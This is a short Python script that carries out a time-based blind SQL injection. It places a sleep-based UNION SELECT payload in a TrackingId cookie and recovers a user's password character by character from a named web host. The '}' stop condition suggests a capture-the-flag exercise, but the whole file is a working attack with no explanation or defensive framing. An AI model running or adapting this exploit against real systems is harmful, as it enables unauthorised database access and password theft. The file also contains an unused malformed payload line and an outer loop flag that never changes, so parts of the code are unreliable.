import requests
import base64
import math
chars ="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"$&'()+./:;<=>@\\^_`{|}~ *?[]!-#"
url = "http://web4.luibo.online/index.php"

requests.packages.urllib3.disable_warnings() 

flag = ""

stop = False
pos = 1
while stop != True:
    char = ord('0')
    start = 32 
    end = 126
    char= (end+start)//2
    while True:
        print("Start = {} ---- End = {} ---- char = {}".format(start,end,char))
        if (end==start):
            flag += chr(char)
            print("Loading data: {}".format(flag))
            pos += 1
            start = 32
            end = 126
            if (chr(char) == '}'):
                break
        else:
            payload = "a'  (ascii(SUBSTRING(password,{},1))>{} and admin=1) -- ".format(str(pos),char)
            cookies = {"TrackingId":"a' union select IF((ascii(SUBSTRING(password,{},1))>{}) ,sleep(3),'a') from users where username='DoubleVKay' -- -".format(str(pos),char)}
            r = requests.post(url, cookies = cookies,verify=False)
            if (r.elapsed.total_seconds() > 2): # True
                start = char+1
            else: # False
                end = char
            char= (end+start)//2

print("Found data: {}".format(flag))
